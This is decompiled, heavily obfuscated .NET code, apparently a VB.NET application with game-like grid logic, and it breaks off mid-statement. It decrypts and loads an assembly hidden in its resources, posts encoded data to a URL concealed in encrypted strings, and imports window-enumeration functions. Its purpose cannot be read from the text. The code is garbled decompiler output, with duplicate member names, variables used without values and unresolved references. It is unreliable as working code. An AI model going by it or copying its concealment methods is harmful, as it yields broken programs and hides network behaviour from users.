using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace A;

[EditorBrowsable(EditorBrowsableState.Never)]
[GeneratedCode("MyTemplate", "8.0.0.0")]
internal class _000F : ApplicationBase
{
}
[EditorBrowsable(EditorBrowsableState.Never)]
[GeneratedCode("MyTemplate", "8.0.0.0")]
internal class _000D : Computer
{
	[DebuggerHidden]
	[EditorBrowsable(EditorBrowsableState.Never)]
	public _000D()
	{
	}
}
internal class _001A
{
	private static readonly Assembly m__000F;

	static _001A()
	{
		_0011_0015._000F(_001A_0016._000F(), _000D);
		_0002_0015._000F(_001A_0016._000F(), _000F);
		Assembly assembly = _0007_0015._000F();
		string text = _000F(assembly);
		_001A.m__000F = _0013_0015._000F(text);
	}

	internal static void _000F()
	{
	}

	private static Assembly _000F(object _000F, ResolveEventArgs _000D)
	{
		Assembly assembly = _0007_0015._000F();
		string text = _001A._000F(assembly);
		if (_0016_0020._000F(_0015_0020._000F(_000D), text))
		{
			Stream stream = _000D_0020._000F(assembly, text);
			byte[] array = _000B._000F(97L, stream);
			return _000F_0020._000F(array);
		}
		return null;
	}

	private static string _000F(Assembly _000F)
	{
		string text = _0020_0015._000F(_000F);
		int num = _0015_0015._000F(text, ',');
		if (num >= 0)
		{
			text = _0016_0015._000F(text, 0, num);
		}
		return _0020_0020._000F(text, '&');
	}

	private static Assembly _000D(object _000F, ResolveEventArgs _000D)
	{
		if ((object)_001A.m__000F != null)
		{
			string[] array = _0017_0020._000F(_001A.m__000F);
			foreach (string text in array)
			{
				if (_001D_0020._000F(text, _0015_0020._000F(_000D)))
				{
					return _001A.m__000F;
				}
			}
			return null;
		}
		return _001A.m__000F;
	}
}
[HideModuleName]
[StandardModule]
[GeneratedCode("MyTemplate", "8.0.0.0")]
internal sealed class _0020
{
	[EditorBrowsable(EditorBrowsableState.Never)]
	[MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
	internal sealed class _0016
	{
		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public _0016()
		{
		}

		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public override bool Equals(object o)
		{
			return _0007._000F(this, _0014._000F(o));
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public override int GetHashCode()
		{
			return _000C._000F(this);
		}

		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		internal Type _000F()
		{
			return _000E._000F(typeof(_0016).TypeHandle);
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public override string ToString()
		{
			return _0013._000F(this);
		}

		[DebuggerHidden]
		private static _000F _000F<_000F>(_000F _000F) where _000F : new()
		{
			if (_000F == null)
			{
				return new _000F();
			}
			return _000F;
		}

		[DebuggerHidden]
		private void _000F<_000F>(ref _000F _000F)
		{
			_000F = default(_000F);
		}
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	[ComVisible(false)]
	internal sealed class _0015<_000F> where _000F : new()
	{
		[ThreadStatic]
		[CompilerGenerated]
		private static _000F m__000F;

		internal _000F _000F
		{
			[DebuggerHidden]
			get
			{
				if (_0015<_000F>._000F == null)
				{
					_0015<_000F>._000F = new _000F();
				}
				return _0015<_000F>._000F;
			}
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public _0015()
		{
		}
	}

	private static readonly _0015<_000D> m__000F = new _0015<_000D>();

	private static readonly _0015<_000F> m__000F = new _0015<_000F>();

	private static readonly _0015<User> m__000F = new _0015<User>();

	private static readonly _0015<_0016> m__000F = new _0015<_0016>();

	[HelpKeyword("My.Computer")]
	internal static _000D _000F
	{
		[DebuggerHidden]
		get
		{
			return _0020.m__000F._000F;
		}
	}

	[HelpKeyword("My.Application")]
	internal static _000F _000F
	{
		[DebuggerHidden]
		get
		{
			return _0020.m__000F._000F;
		}
	}

	[HelpKeyword("My.User")]
	internal static User _000F
	{
		[DebuggerHidden]
		get
		{
			return _0020.m__000F._000F;
		}
	}

	[HelpKeyword("My.WebServices")]
	internal static _0016 _000F
	{
		[DebuggerHidden]
		get
		{
			return _0020.m__000F._000F;
		}
	}
}
public class _001D
{
	public object _000F(string _000F)
	{
		string text = "";
		string text2 = this._000F(_000F);
		string text3 = _0003._000F(1);
		string text4 = _0003._000F(4);
		string text5 = _0003._000F(11);
		string text6 = "";
		string text7 = _0011._000F(this._000F(_0003._000F(18), _000F_000D._000F(_0003._000F(91), text, _0003._000F(150), text2)));
		if (!_0002._000F(text7, _0003._000F(183)))
		{
			return _000D(text7);
		}
		return _0003._000F(214);
	}

	private string _000F(string _000F)
	{
		string text = _000F;
		text = _000D_000D._000F(text, _0003._000F(225), _0003._000F(228), _001E._000F(0), _001E._000F(4), (CompareMethod)_001E._000F(8));
		text = _000D_000D._000F(text, _0003._000F(231), _0003._000F(234), _001E._000F(12), _001E._000F(16), (CompareMethod)_001E._000F(20));
		int num = _001E._000F(24);
		do
		{
			int num2 = num;
			if (num2 != _001E._000F(28) && num2 != _001E._000F(32) && (num2 < _001E._000F(36) || num2 > _001E._000F(40)) && (num2 < _001E._000F(44) || num2 > _001E._000F(48)) && (num2 < _001E._000F(52) || num2 > _001E._000F(56)))
			{
				text = ((num2 == _001E._000F(60)) ? _000D_000D._000F(text, _0020_000D._000F(_001D_000D._000F(num)), _0003._000F(237), _001E._000F(64), _001E._000F(68), (CompareMethod)_001E._000F(72)) : ((num2 == _001E._000F(76)) ? _000D_000D._000F(text, _0020_000D._000F(_001D_000D._000F(num)), _0003._000F(244), _001E._000F(80), _001E._000F(84), (CompareMethod)_001E._000F(88)) : ((num2 == _001E._000F(92)) ? _000D_000D._000F(text, _0020_000D._000F(_001D_000D._000F(num)), _0003._000F(231), _001E._000F(96), _001E._000F(100), (CompareMethod)_001E._000F(104)) : ((num2 < _001E._000F(108) || num2 > _001E._000F(112)) ? _000D_000D._000F(text, _0020_000D._000F(_001D_000D._000F(num)), _0016_000D._000F(_0003._000F(225), _0015_000D._000F(num)), _001E._000F(128), _001E._000F(132), (CompareMethod)_001E._000F(136)) : _000D_000D._000F(text, _0020_000D._000F(_001D_000D._000F(num)), _0016_000D._000F(_0003._000F(251), _0015_000D._000F(num)), _001E._000F(116), _001E._000F(120), (CompareMethod)_001E._000F(124))))));
			}
			num = checked(num + _001E._000F(140));
		}
		while (num <= _001E._000F(144));
		return text;
	}

	public object _000D(string _000F)
	{
		string text = _0017_000D._000F(_000F, checked(_0010_000D._000F(_000F, _0003._000F(256)) + _001E._000F(148)));
		return _0016_000D._000F(_0003._000F(259), text);
	}

	private object _000F(string _000F, string _000D)
	{
		WebRequest webRequest = _001B_000D._000F(_000F);
		_0004_000D._000F(webRequest, _0003._000F(320));
		byte[] array = _001E_000D._000F(_001A_000D._000F(), _000D);
		_0003_000D._000F(webRequest, _0003._000F(329));
		_000B_000D._000F(webRequest, array.Length);
		Stream stream = _0001_000D._000F(webRequest);
		_0009_000D._000F(stream, array, _001E._000F(152), array.Length);
		_0019_000D._000F(stream);
		WebResponse webResponse = _001F_000D._000F(webRequest);
		stream = _0012_000D._000F(webResponse);
		StreamReader streamReader = _0005_000D._000F(stream);
		string result = _0006_000D._000F(streamReader);
		_001C_000D._000F(streamReader);
		_0019_000D._000F(stream);
		_0018_000D._000F(webResponse);
		return result;
	}
}
internal class _0017
{
	public const int _000F = 1;

	public const int _000D = 2;

	public const int _0016 = 3;

	public const int _0015 = 4;

	public const int _0020 = 2;

	[SpecialName]
	private static int _0024STATIC_0024юдэИъШѬЪцзт_0024011C1219_0024dir;

	[SpecialName]
	private static int _0024STATIC_0024ИДЕНКĐЅ_0024001C_0024dir;

	[SpecialName]
	private static int _0024STATIC_0024ЛäэѦѰЛрѬъБщж_0024011C1C_0024dir;

	[SpecialName]
	private static int _0024STATIC_0024юдэИъШѬЪцзт_0024011C1219_0024ani;

	[SpecialName]
	private static int _0024STATIC_0024ИДЕНКĐЅ_0024001C_0024ani;

	[SpecialName]
	private static int _0024STATIC_0024ЛäэѦѰЛрѬъБщж_0024011C1C_0024ani;

	[DllImport("fmod.dll", CharSet = CharSet.Ansi, EntryPoint = "_FSOUND_Sample_Load@20", ExactSpelling = true, SetLastError = true)]
	private static extern int _000F(int _000F, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _000D, int _0016, int _0015, int _0020);

	[DllImport("fmod.dll", CharSet = CharSet.Ansi, EntryPoint = "_FSOUND_PlaySound@8", ExactSpelling = true, SetLastError = true)]
	private static extern int _000F(int _000F, int _000D);

	[DllImport("fmod.dll", CharSet = CharSet.Ansi, EntryPoint = "_FSOUND_Sample_SetMode@8", ExactSpelling = true, SetLastError = true)]
	private static extern byte _000F(int _000F, bool _000D);

	[DllImport("fmod.dll", CharSet = CharSet.Ansi, EntryPoint = "_FSOUND_StopSound@4", ExactSpelling = true, SetLastError = true)]
	private static extern byte _000F(int _000F);

	[DllImport("fmod.dll", CharSet = CharSet.Ansi, EntryPoint = "_FSOUND_IsPlaying@4", ExactSpelling = true, SetLastError = true)]
	private static extern byte _000D(int _000F);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "EnumWindows", ExactSpelling = true, SetLastError = true)]
	public static extern long _000F(long _000F, long _000D);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextA", ExactSpelling = true, SetLastError = true)]
	private static extern long _000F(long _000F, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _000D, long _0016);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "GetClassNameA", ExactSpelling = true, SetLastError = true)]
	private static extern long _000D(long _000F, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _000D, long _0016);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextLengthA", ExactSpelling = true, SetLastError = true)]
	private static extern long _000F(long _000F);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "IsWindowVisible", ExactSpelling = true, SetLastError = true)]
	private static extern long _000D(long _000F);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "GetParent", ExactSpelling = true, SetLastError = true)]
	private static extern long _0016(long _000F);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "IsWindowEnabled", ExactSpelling = true, SetLastError = true)]
	private static extern long _0015(long _000F);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "IsZoomed", ExactSpelling = true, SetLastError = true)]
	public static extern long _0020(long _000F);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "GetWindowPlacement", ExactSpelling = true, SetLastError = true)]
	public static extern long _000D(long _000F, long _000D);

	public static object _000F(Assembly _000F)
	{
		//IL_12ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_1612: Unknown result type (might be due to invalid IL or missing references)
		//IL_162f: Unknown result type (might be due to invalid IL or missing references)
		int num24 = default(int);
		object result = default(object);
		try
		{
			object obj = _0012_0016._000F(_000F);
			_000D("", _0014._000F(obj));
			object obj2 = default(object);
			object obj8 = default(object);
			object obj33 = default(object);
			int i;
			if (_0019_0016._000F(obj2, _001E._000F(156), (byte)_001E._000F(160) != 0))
			{
				object obj3 = default(object);
				int num = _0005_0016._000F(obj3);
				object obj4 = default(object);
				int num2 = _0005_0016._000F(obj4);
				object obj11 = default(object);
				object obj12 = default(object);
				int num12 = default(int);
				object obj27 = default(object);
				object obj28 = default(object);
				object obj7 = default(object);
				object obj5 = default(object);
				for (i = num; i <= num2; i = checked(i + _001E._000F(1044)))
				{
					int num3 = _001E._000F(164);
					object[] array9;
					do
					{
						object obj6 = obj5;
						if (_0011_000D._000F(obj6, _001E._000F(168), (byte)_001E._000F(172) != 0))
						{
							object[] array = new object[_001E._000F(176)];
							array[_001E._000F(180)] = _0017_0016._000F(_0017_0016._000F(i, obj7), checked(num3 * _001E._000F(184)));
							if (_000C_000D._000F(_000E_000D._000F(_0013_000D._000F(_0014_000D._000F(obj8, array, null), null, _0003._000F(396), new object[_001E._000F(188)], null, null, null))))
							{
								array = new object[_001E._000F(192)];
								array[_001E._000F(196)] = _0017_0016._000F(i, obj7);
								object obj9 = _0014_000D._000F(obj8, array, null);
								string text = _0003._000F(413);
								object[] array2 = new object[_001E._000F(200)];
								object[] array3 = array2;
								int num4 = _001E._000F(204);
								string text2 = _0003._000F(422);
								object[] array4 = new object[_001E._000F(208)];
								object[] array5 = array4;
								int num5 = _001E._000F(212);
								object obj10 = _001E._000F(216);
								object[] array6 = new object[_001E._000F(220)];
								array6[_001E._000F(224)] = i;
								array5[num5] = _000F_0016._000F(obj10, _0014_000D._000F(obj11, array6, null));
								array3[num4] = _000F_0016._000F(_0013_000D._000F(obj12, null, text2, array4, null, null, null), _001E._000F(228));
								_0007_000D._000F(obj9, null, text, array2, null, null, null, (byte)_001E._000F(232) != 0);
								array2 = new object[_001E._000F(236)];
								array2[_001E._000F(240)] = _0017_0016._000F(i, obj7);
								object obj13 = _0014_000D._000F(obj8, array2, null);
								string text3 = _0003._000F(459);
								array = new object[_001E._000F(244)];
								object[] array7 = array;
								int num6 = _001E._000F(248);
								string text4 = _0003._000F(468);
								array6 = new object[_001E._000F(252)];
								object[] array8 = array6;
								int num7 = _001E._000F(256);
								object obj14 = _001E._000F(260);
								array4 = new object[_001E._000F(264)];
								array4[_001E._000F(268)] = i;
								array8[num7] = _000F_0016._000F(obj14, _0014_000D._000F(obj11, array4, null));
								array7[num6] = _000F_0016._000F(_0013_000D._000F(obj12, null, text4, array6, null, null, null), _001E._000F(272));
								_0007_000D._000F(obj13, null, text3, array, null, null, null, (byte)_001E._000F(276) != 0);
								array2 = new object[_001E._000F(280)];
								array2[_001E._000F(284)] = _0017_0016._000F(i, _0017_0016._000F(obj7, _001E._000F(288)));
								object obj15 = _0014_000D._000F(obj8, array2, null);
								string text5 = _0003._000F(413);
								array9 = new object[_001E._000F(292)];
								object[] array10 = array9;
								int num8 = _001E._000F(296);
								string text6 = _0003._000F(505);
								array6 = new object[_001E._000F(300)];
								object[] array11 = array6;
								int num9 = _001E._000F(304);
								array4 = new object[_001E._000F(308)];
								array4[_001E._000F(312)] = i;
								array11[num9] = _0014._000F(_0014_000D._000F(obj11, array4, null));
								array = array6;
								object[] array12 = array;
								bool[] array13 = new bool[_001E._000F(316)];
								array13[_001E._000F(320)] = (byte)_001E._000F(324) != 0;
								object obj16 = _0013_000D._000F(obj12, null, text6, array12, null, null, array13);
								object[] array14;
								if (array13[_001E._000F(328)])
								{
									array14 = new object[_001E._000F(332)];
									array14[_001E._000F(336)] = i;
									array14[_001E._000F(340)] = _0014._000F(array[_001E._000F(344)]);
									_0006_0016._000F(obj11, array14, null, (byte)_001E._000F(348) != 0, (byte)_001E._000F(352) != 0);
								}
								array10[num8] = _0017_0016._000F(obj16, _001E._000F(356));
								_0007_000D._000F(obj15, null, text5, array9, null, null, null, (byte)_001E._000F(360) != 0);
								array9 = new object[_001E._000F(364)];
								array9[_001E._000F(368)] = _0017_0016._000F(i, _0017_0016._000F(obj7, _001E._000F(372)));
								object obj17 = _0014_000D._000F(obj8, array9, null);
								string text7 = _0003._000F(459);
								array = new object[_001E._000F(376)];
								object[] array15 = array;
								int num10 = _001E._000F(380);
								string text8 = _0003._000F(544);
								array2 = new object[_001E._000F(384)];
								object[] array16 = array2;
								int num11 = _001E._000F(388);
								array14 = new object[_001E._000F(392)];
								array14[_001E._000F(396)] = i;
								array16[num11] = _0014._000F(_0014_000D._000F(obj11, array14, null));
								array4 = array2;
								object[] array17 = array4;
								array13 = new bool[_001E._000F(400)];
								array13[_001E._000F(404)] = (byte)_001E._000F(408) != 0;
								object obj18 = _0013_000D._000F(obj12, null, text8, array17, null, null, array13);
								if (array13[_001E._000F(412)])
								{
									array6 = new object[_001E._000F(416)];
									array6[_001E._000F(420)] = i;
									array6[_001E._000F(424)] = _0014._000F(array4[_001E._000F(428)]);
									_0006_0016._000F(obj11, array6, null, (byte)_001E._000F(432) != 0, (byte)_001E._000F(436) != 0);
								}
								array15[num10] = _000F_0016._000F(obj18, _001E._000F(440));
								_0007_000D._000F(obj17, null, text7, array, null, null, null, (byte)_001E._000F(444) != 0);
							}
							num12 = _001E._000F(448);
						}
						else if (_0011_000D._000F(obj6, _001E._000F(452), (byte)_001E._000F(456) != 0))
						{
							array9 = new object[_001E._000F(460)];
							array9[_001E._000F(464)] = _0017_0016._000F(_0017_0016._000F(i, obj7), checked(num3 * _001E._000F(468)));
							if (_000C_000D._000F(_000E_000D._000F(_0013_000D._000F(_0014_000D._000F(obj8, array9, null), null, _0003._000F(396), new object[_001E._000F(472)], null, null, null))))
							{
								array9 = new object[_001E._000F(476)];
								array9[_001E._000F(480)] = _0017_0016._000F(i, obj7);
								object obj19 = _0014_000D._000F(obj8, array9, null);
								string text9 = _0003._000F(413);
								object[] array = new object[_001E._000F(484)];
								object[] array18 = array;
								int num13 = _001E._000F(488);
								string text10 = _0003._000F(422);
								object[] array2 = new object[_001E._000F(492)];
								object[] array19 = array2;
								int num14 = _001E._000F(496);
								object[] array14 = new object[_001E._000F(500)];
								array14[_001E._000F(504)] = i;
								array19[num14] = _0014._000F(_0014_000D._000F(obj11, array14, null));
								object[] array4 = array2;
								object[] array20 = array4;
								bool[] array13 = new bool[_001E._000F(508)];
								array13[_001E._000F(512)] = (byte)_001E._000F(516) != 0;
								object obj20 = _0013_000D._000F(obj12, null, text10, array20, null, null, array13);
								if (array13[_001E._000F(520)])
								{
									object[] array6 = new object[_001E._000F(524)];
									array6[_001E._000F(528)] = i;
									array6[_001E._000F(532)] = _0014._000F(array4[_001E._000F(536)]);
									_0006_0016._000F(obj11, array6, null, (byte)_001E._000F(540) != 0, (byte)_001E._000F(544) != 0);
								}
								array18[num13] = _000F_0016._000F(obj20, _001E._000F(548));
								_0007_000D._000F(obj19, null, text9, array, null, null, null, (byte)_001E._000F(552) != 0);
								array9 = new object[_001E._000F(556)];
								array9[_001E._000F(560)] = _0017_0016._000F(i, obj7);
								object obj21 = _0014_000D._000F(obj8, array9, null);
								string text11 = _0003._000F(459);
								array = new object[_001E._000F(564)];
								object[] array21 = array;
								int num15 = _001E._000F(568);
								string text12 = _0003._000F(468);
								array2 = new object[_001E._000F(572)];
								object[] array22 = array2;
								int num16 = _001E._000F(576);
								array14 = new object[_001E._000F(580)];
								array14[_001E._000F(584)] = i;
								array22[num16] = _0014._000F(_0014_000D._000F(obj11, array14, null));
								array4 = array2;
								object[] array23 = array4;
								array13 = new bool[_001E._000F(588)];
								array13[_001E._000F(592)] = (byte)_001E._000F(596) != 0;
								object obj22 = _0013_000D._000F(obj12, null, text12, array23, null, null, array13);
								if (array13[_001E._000F(600)])
								{
									object[] array6 = new object[_001E._000F(604)];
									array6[_001E._000F(608)] = i;
									array6[_001E._000F(612)] = _0014._000F(array4[_001E._000F(616)]);
									_0006_0016._000F(obj11, array6, null, (byte)_001E._000F(620) != 0, (byte)_001E._000F(624) != 0);
								}
								array21[num15] = _000F_0016._000F(obj22, _001E._000F(628));
								_0007_000D._000F(obj21, null, text11, array, null, null, null, (byte)_001E._000F(632) != 0);
								array9 = new object[_001E._000F(636)];
								array9[_001E._000F(640)] = _0017_0016._000F(i, _0017_0016._000F(obj7, _001E._000F(644)));
								object obj23 = _0014_000D._000F(obj8, array9, null);
								string text13 = _0003._000F(413);
								array4 = new object[_001E._000F(648)];
								object[] array24 = array4;
								int num17 = _001E._000F(652);
								string text14 = _0003._000F(505);
								array2 = new object[_001E._000F(656)];
								object[] array25 = array2;
								int num18 = _001E._000F(660);
								object obj24 = _001E._000F(664);
								array14 = new object[_001E._000F(668)];
								array14[_001E._000F(672)] = i;
								array25[num18] = _000F_0016._000F(obj24, _0014_000D._000F(obj11, array14, null));
								array24[num17] = _0017_0016._000F(_0013_000D._000F(obj12, null, text14, array2, null, null, null), _001E._000F(676));
								_0007_000D._000F(obj23, null, text13, array4, null, null, null, (byte)_001E._000F(680) != 0);
								array9 = new object[_001E._000F(684)];
								array9[_001E._000F(688)] = _0017_0016._000F(i, _0017_0016._000F(obj7, _001E._000F(692)));
								object obj25 = _0014_000D._000F(obj8, array9, null);
								string text15 = _0003._000F(459);
								array4 = new object[_001E._000F(696)];
								object[] array26 = array4;
								int num19 = _001E._000F(700);
								string text16 = _0003._000F(544);
								array2 = new object[_001E._000F(704)];
								object[] array27 = array2;
								int num20 = _001E._000F(708);
								object obj26 = _001E._000F(712);
								array14 = new object[_001E._000F(716)];
								array14[_001E._000F(720)] = i;
								array27[num20] = _000F_0016._000F(obj26, _0014_000D._000F(obj11, array14, null));
								array26[num19] = _000F_0016._000F(_0013_000D._000F(obj12, null, text16, array2, null, null, null), _001E._000F(724));
								_0007_000D._000F(obj25, null, text15, array4, null, null, null, (byte)_001E._000F(728) != 0);
							}
							num12 = _001E._000F(732);
						}
						int num21 = _001E._000F(736);
						if (num21 < _001E._000F(740))
						{
							num21 = _001E._000F(744);
						}
						int num22 = num21;
						if (num22 == _001E._000F(748))
						{
							if (_0019_0016._000F(obj27, _001E._000F(752), (byte)_001E._000F(756) != 0))
							{
								array9 = new object[_001E._000F(760)];
								array9[_001E._000F(764)] = _0017_0016._000F(_0017_0016._000F(i, obj7), checked(num3 * _001E._000F(768)));
								if (_000C_000D._000F(_000E_000D._000F(_0013_000D._000F(_0014_000D._000F(obj8, array9, null), null, _0003._000F(583), new object[_001E._000F(772)], null, null, null))))
								{
									switch (num3)
									{
									case 0:
									{
										object[] array14 = new object[_001E._000F(776)];
										array14[_001E._000F(780)] = _0017_0016._000F(i, obj7);
										if (_001C_0016._000F(_0013_000D._000F(_0014_000D._000F(obj8, array14, null), null, _0003._000F(612), new object[_001E._000F(784)], null, null, null), _001E._000F(788), (byte)_001E._000F(792) != 0))
										{
											obj27 = _0017_0016._000F(obj27, _001E._000F(796));
										}
										break;
									}
									case 1:
										array9 = new object[_001E._000F(800)];
										array9[_001E._000F(804)] = _0017_0016._000F(_0017_0016._000F(i, obj7), checked(num3 * _001E._000F(808)));
										if (_0019_0016._000F(_0013_000D._000F(_0014_000D._000F(obj8, array9, null), null, _0003._000F(612), new object[_001E._000F(812)], null, null, null), _001E._000F(816), (byte)_001E._000F(820) != 0))
										{
											obj27 = _0017_0016._000F(obj27, _001E._000F(824));
										}
										break;
									}
								}
							}
						}
						else if (num22 < _001E._000F(828) && _0019_0016._000F(obj28, _001E._000F(832), (byte)_001E._000F(836) != 0))
						{
							array9 = new object[_001E._000F(840)];
							array9[_001E._000F(844)] = _0017_0016._000F(_0017_0016._000F(i, obj7), checked(num3 * _001E._000F(848)));
							if (_000C_000D._000F(_000E_000D._000F(_0013_000D._000F(_0014_000D._000F(obj8, array9, null), null, _0003._000F(621), new object[_001E._000F(852)], null, null, null))))
							{
								switch (num3)
								{
								case 0:
								{
									object[] array14 = new object[_001E._000F(856)];
									array14[_001E._000F(860)] = _0017_0016._000F(i, obj7);
									if (_001C_0016._000F(_0013_000D._000F(_0014_000D._000F(obj8, array14, null), null, _0003._000F(612), new object[_001E._000F(864)], null, null, null), _001E._000F(868), (byte)_001E._000F(872) != 0))
									{
										object[] array2 = new object[_001E._000F(876)];
										array2[_001E._000F(880)] = _0017_0016._000F(i, obj7);
										object obj30 = _0014_000D._000F(obj8, array2, null);
										string text18 = _0003._000F(642);
										object[] array4 = new object[_001E._000F(884)];
										array4[_001E._000F(888)] = (byte)_001E._000F(892) != 0;
										_0007_000D._000F(obj30, null, text18, array4, null, null, null, (byte)_001E._000F(896) != 0);
										obj28 = _0017_0016._000F(obj28, _001E._000F(900));
									}
									break;
								}
								case 1:
									array9 = new object[_001E._000F(904)];
									array9[_001E._000F(908)] = _0017_0016._000F(_0017_0016._000F(i, obj7), checked(num3 * _001E._000F(912)));
									if (_0019_0016._000F(_0013_000D._000F(_0014_000D._000F(obj8, array9, null), null, _0003._000F(612), new object[_001E._000F(916)], null, null, null), _001E._000F(920), (byte)_001E._000F(924) != 0))
									{
										object[] array14 = new object[_001E._000F(928)];
										array14[_001E._000F(932)] = _0017_0016._000F(_0017_0016._000F(i, obj7), checked(num3 * _001E._000F(936)));
										object obj29 = _0014_000D._000F(obj8, array14, null);
										string text17 = _0003._000F(642);
										object[] array2 = new object[_001E._000F(940)];
										array2[_001E._000F(944)] = (byte)_001E._000F(948) != 0;
										_0007_000D._000F(obj29, null, text17, array2, null, null, null, (byte)_001E._000F(952) != 0);
										obj28 = _0017_0016._000F(obj28, _001E._000F(956));
									}
									break;
								}
							}
						}
						num3 = checked(num3 + _001E._000F(960));
					}
					while (num3 <= _001E._000F(964));
					array9 = new object[_001E._000F(968)];
					array9[_001E._000F(972)] = i;
					if (_0018_0016._000F(_0014_000D._000F(obj11, array9, null), _001E._000F(976), (byte)_001E._000F(980) != 0))
					{
						obj3 = _0017_0016._000F(obj3, _001E._000F(984));
						obj2 = _0017_0016._000F(obj2, _001E._000F(988));
						num3 = _001E._000F(992);
						checked
						{
							do
							{
								array9 = new object[_001E._000F(996)];
								array9[_001E._000F(1000)] = _0017_0016._000F(_0017_0016._000F(i, obj7), num3 * _001E._000F(1004));
								if (_000C_000D._000F(_000E_000D._000F(_0013_000D._000F(_0014_000D._000F(obj8, array9, null), null, _0003._000F(583), new object[_001E._000F(1008)], null, null, null))))
								{
									_0015_0016._000F(_0003._000F(669), (MsgBoxStyle)_001E._000F(1012), null);
								}
								num3 += _001E._000F(1016);
							}
							while (num3 <= _001E._000F(1020));
						}
					}
					else
					{
						object[] array14 = new object[_001E._000F(1024)];
						array14[_001E._000F(1028)] = i;
						object[] array28 = array14;
						int num23 = _001E._000F(1032);
						array9 = new object[_001E._000F(1036)];
						array9[_001E._000F(1040)] = i;
						array28[num23] = _0017_0016._000F(_0014_000D._000F(obj11, array9, null), num12);
						_0020_0016._000F(obj11, array14, null);
					}
				}
				bool flag = default(bool);
				if (_0011_000D._000F(obj3, _001E._000F(1048), (byte)_001E._000F(1052) != 0))
				{
					object obj31 = obj2;
					if (_000C_000D._000F((_000C_000D._000F(_0010_0016._000F(obj31, _001E._000F(1056), (byte)_001E._000F(1060) != 0)) || _000C_000D._000F(_0010_0016._000F(obj31, _001E._000F(1064), (byte)_001E._000F(1068) != 0)) || _000C_000D._000F(_0010_0016._000F(obj31, _001E._000F(1072), (byte)_001E._000F(1076) != 0)) || _000C_000D._000F(_0010_0016._000F(obj31, _001E._000F(1080), (byte)_001E._000F(1084) != 0))) ? ((object)((byte)_001E._000F(1092) != 0)) : ((object)((byte)_001E._000F(1088) != 0))))
					{
						flag = (byte)_001E._000F(1096) != 0;
						obj7 = _0014._000F(obj2);
					}
				}
				object obj32 = _001E._000F(1100);
				if (flag)
				{
					if (_0011_000D._000F(obj33, _001E._000F(1104), (byte)_001E._000F(1108) != 0))
					{
						obj32 = _0017_0016._000F(obj32, _001E._000F(1112));
					}
					if (_0011_000D._000F(obj32, _001E._000F(1116), (byte)_001E._000F(1120) != 0))
					{
						obj5 = _0017_0016._000F(obj5, _001E._000F(1124));
						obj5 = _001D_0016._000F(obj5, _001E._000F(1128));
						i = _001E._000F(1132);
						do
						{
							object[] array9 = new object[_001E._000F(1136)];
							array9[_001E._000F(1140)] = i;
							array9[_001E._000F(1144)] = _001E._000F(1148);
							_0020_0016._000F(obj11, array9, null);
							i = checked(i + _001E._000F(1152));
						}
						while (i <= _001E._000F(1156));
						obj4 = _001E._000F(1160);
						obj3 = _001E._000F(1164);
						obj32 = _001E._000F(1168);
						flag = (byte)_001E._000F(1172) != 0;
					}
				}
			}
			num24 = _001E._000F(1176);
			i = _001E._000F(1180);
			do
			{
				switch (_0024STATIC_0024юдэИъШѬЪцзт_0024011C1219_0024dir)
				{
				case 0:
					_0015_0016._000F(_0003._000F(678), (MsgBoxStyle)_001E._000F(1184), null);
					break;
				case 1:
					_0015_0016._000F(_0003._000F(681), (MsgBoxStyle)_001E._000F(1188), null);
					break;
				}
				object[] array9 = new object[_001E._000F(1192)];
				array9[_001E._000F(1196)] = i;
				if (_000C_000D._000F(_0013_000D._000F(_0014_000D._000F(obj8, array9, null), null, _0003._000F(684), new object[_001E._000F(1200)], null, null, null)))
				{
					array9 = new object[_001E._000F(1204)];
					array9[_001E._000F(1208)] = i;
					if (_000C_000D._000F(_0013_000D._000F(_0014_000D._000F(obj8, array9, null), null, _0003._000F(701), new object[_001E._000F(1212)], null, null, null)))
					{
						array9 = new object[_001E._000F(1216)];
						array9[_001E._000F(1220)] = i;
						object obj34 = _0013_000D._000F(_0014_000D._000F(obj8, array9, null), null, _0003._000F(718), new object[_001E._000F(1224)], null, null, null);
						if (_000C_000D._000F((!_000C_000D._000F(_0016_0016._000F(obj34, _001E._000F(1228), (byte)_001E._000F(1232) != 0)) || !_000C_000D._000F(_000D_0016._000F(obj34, _001E._000F(1236), (byte)_001E._000F(1240) != 0))) ? ((object)((byte)_001E._000F(1248) != 0)) : ((object)((byte)_001E._000F(1244) != 0))))
						{
							object[] array14 = new object[_001E._000F(1252)];
							array14[_001E._000F(1256)] = i;
							object obj35 = _0014_000D._000F(obj8, array14, null);
							string text19 = _0003._000F(413);
							object[] array4 = new object[_001E._000F(1260)];
							object[] array29 = array4;
							int num25 = _001E._000F(1264);
							object[] array2 = new object[_001E._000F(1268)];
